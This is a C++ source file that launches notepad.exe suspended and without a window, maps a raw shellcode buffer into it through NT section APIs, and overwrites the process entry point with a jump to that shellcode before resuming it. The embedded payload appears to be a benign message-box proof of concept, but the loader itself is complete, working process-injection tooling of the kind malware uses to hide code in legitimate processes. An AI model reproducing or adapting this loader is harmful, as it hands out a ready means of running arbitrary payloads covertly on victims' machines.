#include "Header.h"

myNtCreateSection fNtCreateSection = (myNtCreateSection)(GetProcAddress(GetModuleHandleA("ntdll"),
    "NtCreateSection"));
myNtMapViewOfSection fNtMapViewOfSection = (myNtMapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"),
    "NtMapViewOfSection"));
myZwUnmapViewOfSection fZwUnmapViewOfSection = (myZwUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"),
    "ZwUnmapViewOfSection"));
myNtGetContextThread fNtGetContextThread = (myNtGetContextThread)(GetProcAddress(GetModuleHandleA("ntdll"),
    "NtGetContextThread"));
myNtSetContextThread fNtSetContextThread = (myNtSetContextThread)(GetProcAddress(GetModuleHandleA("ntdll"),
    "NtSetContextThread"));

DWORD GetSizeOfImage(BYTE* processImage)
{
    IMAGE_DOS_HEADER* dosHeader = NULL;
    IMAGE_NT_HEADERS* ntHeaders = NULL;

    dosHeader = (IMAGE_DOS_HEADER*)processImage;
    ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)processImage + dosHeader->e_lfanew);

    return ntHeaders->OptionalHeader.SizeOfImage;
}

DWORD GetEntryPoint(BYTE* processImage)
{
    IMAGE_DOS_HEADER* dosHeader = NULL;
    IMAGE_NT_HEADERS* ntHeaders = NULL;

    dosHeader = (IMAGE_DOS_HEADER*)processImage;
    ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)processImage + dosHeader->e_lfanew);

    return (ntHeaders->OptionalHeader.AddressOfEntryPoint);
}

PVOID PatchHostProcess(HOST* hostProcess, PVOID shellcodeAddress)
{
    // read enough bytes to get the size of image
    SIZE_T bytesRead = 0;
    BYTE* imageData = new(BYTE[SECTION_SIZE]);

    // both calls read the same chunk of same size because this readprocessmemory fails we change the size 
    if (!ReadProcessMemory(hostProcess->processHandle, (LPCVOID)hostProcess->imageBaseAddress, imageData,
        SECTION_SIZE, &bytesRead) && bytesRead != SECTION_SIZE)
    {
        std::cout << "failed to read image headers\n";
        return NULL;
    }

    DWORD sizeOfImage = GetSizeOfImage(imageData);
    delete[] imageData;

    BYTE* processImage = new(BYTE[sizeOfImage]);
    if (!ReadProcessMemory(hostProcess->processHandle, (LPCVOID)hostProcess->imageBaseAddress, processImage,
        sizeOfImage, &bytesRead) && bytesRead != sizeOfImage)
    {
        std::cout << "failed to read memory\n";
        return NULL;
    }

    DWORD entryPoint = GetEntryPoint(processImage);

    std::cout << "[!]Original entry point : 0x" << std::hex << hostProcess->imageBaseAddress + entryPoint << std::endl;

    memset(processImage + entryPoint, 0x90, 5);

    DWORD processEntry = hostProcess->imageBaseAddress + entryPoint;

    DWORD relativeAddr = (((DWORD)shellcodeAddress - processEntry) - 5);

    *((BYTE*)processImage + entryPoint) = 0xe9; // jmp
    *(uintptr_t*)((uintptr_t)processImage + entryPoint + 1) = relativeAddr; // address

    LARGE_INTEGER sectionSize = { sizeOfImage };
    HANDLE sectionHandle = NULL;
    PVOID sectionAddress = NULL;

    if (fNtCreateSection(&sectionHandle, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE,
        SEC_COMMIT, NULL) != STATUS_SUCCESS)
    {
        std::cout << "create section failed\n";
        return NULL;
    }

    if (fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &sectionAddress, NULL, NULL, NULL, &bytesRead, 2, NULL,
        PAGE_EXECUTE_READWRITE) != STATUS_SUCCESS)
    {
        std::cout << "create section failed\n";
        return NULL;
    }

    std::cout << "[!]replacing patched process image at 0x" << std::hex << hostProcess->imageBaseAddress << std::endl;

    memcpy(sectionAddress, processImage, sizeOfImage);
    sectionAddress = (PVOID)hostProcess->imageBaseAddress;

    if (fZwUnmapViewOfSection(hostProcess->processHandle, sectionAddress) != STATUS_SUCCESS)
    {
        std::cout << "unmapping failed\n";
        return NULL;
    }

    if (fNtMapViewOfSection(sectionHandle, hostProcess->processHandle, &sectionAddress, NULL, NULL, NULL,
        &bytesRead, 2, NULL, PAGE_EXECUTE_READWRITE) != STATUS_SUCCESS)
    {
        std::cout << "create section failed\n";
        return NULL;
    }

    CloseHandle(sectionHandle);

    delete[] processImage;
    return (PVOID)processEntry;
}

PVOID InjectShellcode(HOST* hostProcess, SHELLCODE* s)
{
    LARGE_INTEGER sectionSize = { s->shellcodeSize };
    HANDLE sectionHandle = NULL;
    PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;

    // create a read write execute memory region in the local process
    if (fNtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL,
        (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL) != STATUS_SUCCESS)
    {
        std::cout << "[x]Create section failed\n";
        return NULL;
    }

    // create a view of the memory section in the local process
    if (fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL,
        &s->shellcodeSize, 2, NULL, PAGE_READWRITE) != STATUS_SUCCESS)
    {
        std::cout << "[x]Create map failed\n";
        return NULL;
    }

    // create a map view of the section in the target process
    if (fNtMapViewOfSection(sectionHandle, hostProcess->processHandle, &remoteSectionAddress, NULL, NULL, NULL,
        &s->shellcodeSize, 2, NULL, PAGE_EXECUTE_READ) != STATUS_SUCCESS)
    {
        std::cout << "[x]Create map failed\n";
        return NULL;
    }

    memcpy(localSectionAddress, s->shellcode, s->shellcodeSize);
    std::cout << "[!]Shellcode injected to 0x" << std::hex << (DWORD)remoteSectionAddress << std::endl;

    CloseHandle(sectionHandle);
    return remoteSectionAddress;
}


int main(void)
{
    unsigned char buf[] =
        "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b"
        "\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b"
        "\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24"
        "\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
        "\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0"
        "\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c"
        "\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a"
        "\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"
        "\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f"
        "\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52"
        "\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33"
        "\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89"
        "\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
        "\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67"
        "\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3"
        "\x68\x6b\x74\x58\x20\x68\x74\x20\x72\x65\x68\x45\x3d\x67\x65"
        "\x68\x54\x49\x54\x4c\x68\x72\x65\x6b\x74\x68\x67\x65\x74\x20"
        "\x31\xc9\x88\x4c\x24\x16\x89\xe1\x31\xd2\x52\x53\x51\x52\xff"
        "\xd0\x31\xc0\x50\xff\x55\x08";


    HOST* hostProcess = new HOST();
    LPSTARTUPINFOA si = new STARTUPINFOA();
    LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
    PROCESS_BASIC_INFORMATION* pbi = new PROCESS_BASIC_INFORMATION();
    DWORD returnLength = 0;
    CONTEXT ctx;

    SHELLCODE* s = new SHELLCODE();
    s->shellcode = buf;
    s->shellcodeSize = sizeof(buf);

    if (CreateProcessA("C:\\Windows\\System32\\notepad.exe", (LPSTR)"C:\\Windows\\System32\\notepad.exe",
        NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, si, pi) == FALSE)
    {
        std::cout << "[x]Failed to execute notepad.exe\n";
        return FALSE;
    }
    std::cout << "[!]Executed notepad.exe\n";

    hostProcess->processHandle = pi->hProcess;
    ctx.ContextFlags = CONTEXT_FULL;
    fNtGetContextThread(pi->hThread, &ctx); // getting thread context

    NtQueryInformationProcess(hostProcess->processHandle, ProcessBasicInformation, pbi,
        sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
    DWORD pebImageBaseOffset = (DWORD)pbi->PebBaseAddress + 0x8;

    SIZE_T bytesRead = 0;
    if (!ReadProcessMemory(hostProcess->processHandle, (LPCVOID)pebImageBaseOffset, &hostProcess->imageBaseAddress,
        4, &bytesRead) && bytesRead != 4)
    {
        std::cout << "failed to read image base address" << std::endl;
        return -1;
    }

    PVOID remoteShellcodeAddress = InjectShellcode(hostProcess, s);
    if (remoteShellcodeAddress == NULL)
    {
        std::cout << "shellcode injection failed\n";
        return -1;
    }

    PVOID addr = NULL;
    if ((addr = PatchHostProcess(hostProcess, remoteShellcodeAddress)) == NULL)
    {
        std::cout << "failed tp patch host\n";
        return -1;
    }

    fNtSetContextThread(pi->hThread, &ctx);

    std::cout << "[!] Resumed thread\n";
    ResumeThread(pi->hThread);
}